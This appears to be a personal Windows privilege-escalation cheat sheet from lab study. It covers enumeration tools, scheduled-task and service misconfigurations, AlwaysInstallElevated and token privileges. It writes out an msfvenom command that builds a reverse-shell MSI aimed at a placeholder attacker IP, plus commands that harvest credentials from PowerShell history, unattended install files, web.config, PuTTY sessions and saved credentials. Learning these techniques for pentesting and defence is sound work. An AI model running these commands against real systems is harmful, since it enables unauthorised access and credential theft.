Tools (EZPZ but loud)
---
#### Touching Disk
WinPeas -- [WinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS)
Usage -
`winpeas.exe > outputfile.txt`

PrivescCheck -- [PrivescCheck (PS1)](https://github.com/itm4n/PrivescCheck)
Usage -
```powershell
Set-ExecutionPolicy Bypass -Scope process -Force
. .\PrivescCheck.ps1
Invoke-PrivescCheck
```

#### No Disk

WES-NG -- [WES-NG](https://github.com/bitsadmin/wesng)
Usage
```powershell
wes.py --update # Attacker PC
wes.py systeminfo.txt # Attacker PC

echo systeminfo > systeminfo.txt # Victim PC
```

#### Easy checks

Metasploit (if meterpreter shell)
 `multi/recon/local_exploit_suggester`









Scheduled Tasks
---
If there is a task that you can modify or the binary is lost you can create one in its place


```powershell
C:\> schtasks /query /tn taskname /fo list /v 
Folder: \ 
HostName: THM-PC1 
TaskName: \vulntask 
Task To Run: C:\tasks\schtask.bat # The File to run
Run As User: taskusr1 # This is who can run it
```

Next we could check Permissions on that by using `icals` like so 

```powershell
C:\> icacls c:\tasks\schtask.bat c:\tasks\schtask.bat 
NT AUTHORITY\SYSTEM:(I)(F) 
BUILTIN\Administrators:(I)(F) 
BUILTIN\Users:(I)(F) 
# (F) Means Full access meaning we can edit
```

---





Always Install Elevated
---
This technique uses MSI files to check if its vulnerable check for these


```powershell
C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer 
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

with this we can generate a malicious MSI file using msfvenom like so

````shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
````

---







Services
---

Gather config on a service `sc qc servicename`

Services are stored in the key `HKLM\SYSTEM\CurrentControlSet\Services\`

Using registry
- ObjectName: Account Used to start svc
- ImagePath: Location of file(s)
- Security: Permissions

If Permissions aren't properly set we can update service settings/files and deploy a shell that way.


### Unquoted Service Path

![[Windows PrivEsc Unquoted ServicePath.png]]

**The Search Order**

Instead of looking for the full path immediately, Windows searches for the first possible executable it finds, moving from left to right:

1. `C:\MyPrograms\Disk.exe`
2. `C:\MyPrograms\Disk Sorter.exe`
3. `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe` (The intended binary)

**The Vulnerability**

If an attacker has write permissions to any of the parent directories (like `C:\MyPrograms`), they can place a malicious executable named `Disk.exe` in that folder. The next time the service starts, Windows will execute the attacker’s file instead of the legitimate one.

**Why it usually fails (and why it works here)**

- **Standard Paths:** Most services live in `C:\Program Files`, which is restricted to Administrators.
- **The Flaw:** In this scenario, the software is installed in `C:\MyPrograms`. Since this folder inherits permissions from the root `C:\` drive, it often allows standard users to create new files, making the exploit possible.


### Insecure Service Permissions

Even if that's all still configured you can use a tool called accesschk from the sysinternals suite to see what access you have to a given service.

`accesschk64.exe -qlc SERVICE_NAME`

You're looking for what your current highest permissions have access to you want to look for a (service_all_access)


Using this you can modify the file it points to, and essentially have full control over the service.

---







Privileges
---

Quick little cheat sheet for privileges -- [Priv2Admin.](https://github.com/gtworek/Priv2Admin)

Stuff to look out for **EASIEST TO HARDEST**
- `SeBackup / SeRestore`
- `SeTakeOwnership`
- `SeImpersonate / SeAssignPrimaryToken`
---





Random Stuff to Try
---
#IIS #UnattendedInstallation #PSHistory #Powershell #PuTTY


Unattended Windows Installations

In the possible following dirs
```powershell
- C:\Unattend.xml
- C:\Windows\Panther\Unattend.xml
- C:\Windows\Panther\Unattend\Unattend.xml
- C:\Windows\system32\sysprep.inf
- C:\Windows\system32\sysprep\sysprep.xml
```

 Windows Powershell history
````shell-session
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
````

 Saved Credentials

```shell-session
cmdkey /list
```


```shell-session
runas /savecred /user:admin cmd.exe
```

IIS Web Server

Look for the following files 
- C:\inetpub\wwwroot\web.config
- C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config

```shell-session
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

 Retrieve credentials From PuTTY
```shell-session
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```

---




